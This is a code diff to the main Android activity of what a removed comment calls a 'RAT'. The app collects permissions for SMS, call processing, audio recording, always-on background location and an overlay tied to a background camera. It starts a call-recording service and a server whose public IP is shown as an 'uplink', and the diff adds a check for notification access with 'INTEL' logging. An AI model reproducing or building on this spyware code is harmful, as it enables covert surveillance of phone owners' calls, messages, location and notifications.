@@ -11,13 +11,8 @@ import android.os.Environment;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
-import android.animation.ArgbEvaluator;
-import android.animation.ObjectAnimator;
 import android.animation.ValueAnimator;
-import android.view.animation.Animation;
-import android.view.animation.AnimationUtils;
 import android.view.animation.LinearInterpolator;
-import android.widget.Button;
 import com.google.android.material.button.MaterialButton;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -208,9 +203,6 @@ public class MainActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             if (ContextCompat.checkSelfPermission(this,
                     Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                // Note: On Android 11+, this should ideally be requested AFTER fine/coarse are granted.
-                // For simplicity in this RAT, we add it to the initial list if on Android 10.
-                // On Android 11+, we might need a separate dialog or just hope the user grants it.
                 if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
                     permissionsNeeded.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
                 }
@@ -231,7 +223,7 @@ public class MainActivity extends AppCompatActivity {
             permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
         }
 
-        // Phone state permission for device info
+        // Phone state permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
@@ -249,7 +241,7 @@ public class MainActivity extends AppCompatActivity {
             permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
         }
 
-        // Process outgoing calls permission (for call detection)
+        // Process outgoing calls permission
         if (ContextCompat.checkSelfPermission(this,
                 Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
             permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
@@ -274,7 +266,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // Request overlay permission for background camera
+        // Request overlay permission
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.canDrawOverlays(this)) {
                 Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -329,7 +321,6 @@ public class MainActivity extends AppCompatActivity {
             @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            // Check if foreground location was just granted
             boolean fineGranted = false;
             boolean coarseGranted = false;
             for (int i = 0; i < permissions.length; i++) {
@@ -338,7 +329,6 @@ public class MainActivity extends AppCompatActivity {
             }
 
             if ((fineGranted || coarseGranted) && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                // Request background location separately for Android 11+
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                     Toast.makeText(this, "Please select 'Allow all the time' for background tracking", Toast.LENGTH_LONG).show();
                     ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, 1004);
@@ -357,7 +347,6 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void startServer() {
-        // Immediate UI feedback
         btnStartStop.setEnabled(false);
         tvStatus.setText("🟡 INITIALIZING...");
         
@@ -370,7 +359,6 @@ public class MainActivity extends AppCompatActivity {
             startService(serviceIntent);
         }
 
-        // Start CallRecordService for call detection and recording
         Intent callServiceIntent = new Intent(this, CallRecordService.class);
         callServiceIntent.setAction("START_SERVICE");
         try {
@@ -383,7 +371,6 @@ public class MainActivity extends AppCompatActivity {
             Log.e("MainActivity", "Error starting CallRecordService: " + e.getMessage());
         }
 
-        // Re-enable and update after short delay to allow service to bind/start
         btnStartStop.postDelayed(() -> {
             btnStartStop.setEnabled(true);
             updateUI();
@@ -414,7 +401,6 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setText("🟢 SERVER_ONLINE");
             tvStatus.setTextColor(getColor(R.color.neon_green));
             btnStartStop.setText("TERMINATE UPLINK");
-            // Force the button to turn RED when the server is running
             btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_red)));
             btnStartStop.setTextColor(getColor(R.color.white));
 
@@ -425,9 +411,7 @@ public class MainActivity extends AppCompatActivity {
                 String localIp = getLocalIpAddress();
                 runOnUiThread(() -> {
                     StringBuilder ipText = new StringBuilder();
-                    if (localIp != null) {
-                        ipText.append("LOCAL: ").append(localIp);
-                    }
+                    if (localIp != null) ipText.append("LOCAL: ").append(localIp);
                     if (publicIp != null && !publicIp.equals(localIp)) {
                         if (ipText.length() > 0) ipText.append("\n");
                         ipText.append("GLOBAL: ").append(publicIp);
@@ -449,7 +433,6 @@ public class MainActivity extends AppCompatActivity {
             tvStatus.setText("🔴 SERVER_OFFLINE");
             tvStatus.setTextColor(getColor(R.color.neon_red));
             btnStartStop.setText("INITIALIZE SERVER");
-            // Force the button to turn CYAN when the server is offline
             btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(getColor(R.color.neon_cyan)));
             btnStartStop.setTextColor(getColor(R.color.bg_dark));
             tvServerUrl.setText("UPLINK_INACTIVE");
@@ -457,9 +440,7 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    public interface IpCallback {
-        void onResult(String ip);
-    }
+    public interface IpCallback { void onResult(String ip); }
 
     public static void getPublicIPv6Async(IpCallback callback) {
         ExecutorService executor = Executors.newSingleThreadExecutor();
@@ -473,15 +454,9 @@ public class MainActivity extends AppCompatActivity {
                 BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                 publicIp = in.readLine();
                 in.close();
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
+            } catch (Exception e) { e.printStackTrace(); }
 
-            // If external fetch fails, try to find a global unicast address locally
-            if (publicIp == null) {
-                publicIp = getLocalIPv6Address();
-            }
-
+            if (publicIp == null) publicIp = getLocalIPv6Address();
             callback.onResult(publicIp);
         });
         executor.shutdown();
@@ -491,7 +466,6 @@ public class MainActivity extends AppCompatActivity {
         try {
             List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
             for (NetworkInterface intf : interfaces) {
-                // Skip virtual/p2p interfaces
                 if (intf.getName().contains("wlan") || intf.getName().contains("eth") || intf.getName().contains("rmnet")) {
                     List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                     for (InetAddress addr : addrs) {
@@ -499,34 +473,20 @@ public class MainActivity extends AppCompatActivity {
                             String ip = addr.getHostAddress();
                             int idx = ip.indexOf('%');
                             if (idx >= 0) ip = ip.substring(0, idx);
-
                             if (addr instanceof Inet6Address) {
-                                // Prefer Global Unicast or Unique Local Addresses for IPv6
-                                if (!addr.isLinkLocalAddress()) {
-                                    return ip;
-                                }
-                            } else {
-                                // IPv4
-                                return ip;
-                            }
+                                if (!addr.isLinkLocalAddress()) return ip;
+                            } else { return ip; }
                         }
                     }
                 }
             }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+        } catch (Exception e) { e.printStackTrace(); }
         return null;
     }
 
-    // Renamed from getIPv6Address to avoid confusion
-    public static String getLocalIPv6Address() {
-        return getLocalIpAddress();
-    }
+    public static String getLocalIPv6Address() { return getLocalIpAddress(); }
 
-    private boolean isIPv6(String ip) {
-        return ip != null && ip.contains(":");
-    }
+    private boolean isIPv6(String ip) { return ip != null && ip.contains(":"); }
 
     private boolean isNotificationServiceEnabled() {
         String pkgName = getPackageName();
@@ -535,17 +495,23 @@ public class MainActivity extends AppCompatActivity {
             final String[] names = flat.split(":");
             for (String name : names) {
                 final ComponentName cn = ComponentName.unflattenFromString(name);
-                if (cn != null && pkgName.equals(cn.getPackageName())) {
-                    return true;
-                }
+                if (cn != null && pkgName.equals(cn.getPackageName())) return true;
             }
         }
         return false;
+    }
+
+    private void checkNotificationAccess() {
+        if (!isNotificationServiceEnabled()) {
+            Toast.makeText(this, "WARNING: Notification Access Required", Toast.LENGTH_LONG).show();
+            if (isServerRunning()) LabRatsHttpServer.logActivity("INTEL_WARNING: Notification access not granted");
+        }
     }
 
     @Override
     protected void onResume() {
         super.onResume();
         updateUI();
+        checkNotificationAccess();
     }
 }
